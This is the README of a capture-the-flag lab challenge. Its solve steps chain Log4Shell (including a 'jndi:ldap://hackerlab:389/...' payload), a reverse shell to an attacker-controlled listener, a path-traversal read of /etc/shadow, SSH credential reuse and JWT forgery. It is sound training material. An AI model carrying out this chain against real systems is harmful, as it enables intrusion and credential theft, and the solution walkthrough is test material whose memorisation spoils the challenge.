# Forgot Your Password

This challenge focuses on exploiting a vulnerability chain involving multiple systems and security flaws.
Students must demonstrate skills in vulnerability exploitation, lateral movement, and privilege escalation across a network of interconnected services.

## Skills Used

1. **Vulnerability Exploitation**: Exploiting Log4Shell (CVE-2021-44228) and path traversal (CVE-2021-42013)
1. **Network Penetration**: Setting up reverse shells, LDAP and HTTP servers as payload hosts
1. **Lateral Movement**: SSH credential reuse and internal network reconnaissance
1. **JWT Security**: Extracting signing secrets and forging authenticated tokens
1. **System Analysis**: Reading log files, extracting user IDs, and analyzing JAR files
1. **Microservices**: Understanding service dependencies in decentralized environments

## Learning Objectives

- Understand how **vulnerability chaining** works in multi-machine attacks
- Learn about **Log4Shell exploitation**
- Practice **lateral movement** techniques in containerized environments
- Develop skills in **JWT security** and common misconfigurations
- Gain experience with **internal network reconnaissance** after initial compromise

## How to solve

Follow the instructions in the [attached auto-solver application](./auto-solve/ldap-server/src/main/java).

TLDR:

<details>
  <summary>Click to reveal how to solve steps</summary>
1. Get a reverse shell to the challenge's internal network:
    1. In the hackerlab, start a reverse shell listener (e.g. on port 1338)
    2. Also in the hackerlab, start [an HTTP server](./auto-solve/ldap-server/src/main/java/PayloadHTTPServer.java) (e.g. on port 8083) to host a [class that will launch a reverse shell](./auto-solve/Exploit.java) connection to the listener from the previous step (i.e., `hackerlab:1338`)
    3. Still in the hackerlab, start [an LDAP server](./auto-solve/ldap-server/src/main/java/LDAPRefServer.java) to point to the hosted class from the previous step (i.e., `http://hackerlab:8083/#Exploit`)
    4. [Post a payload](./auto-solve/ldap-server/src/main/java/Launcher.java) to the Java app running at `/auth/*` to exploit [CVE-2021-44228 (also known as Log4Shell)](https://en.wikipedia.org/wiki/Log4Shell) and point to the LDAP server from the previous step (i.e., `jndi:ldap://hackerlab:389/...`)
   5. The payload should enable the reverse shell - from the hackerlab, you should now be able to run commands on another machine (`authus` inside the `172.21.0.0/24` network)
2. Your reverse shell should now be functional. Use it to explore the connected machine and its network
3. From the sources of the application the reverse shell is running through (JAR located in `/app/`), extract a HMAC256 JWT signing secret
4. Find a `mailus` suffering from CVE-2021-42013, allowing an attacker to read `/etc/shadow`
5. Reuse the same credentials to SSH into `logus` and extract a user ID from `/var/log/dashboard/proxy2021-12-09.log`
6. Forge a JWT with containing simply the user ID, and sign it with the signing secret
7. Access the dashboard (repository) and copy and submit the flag
</details>
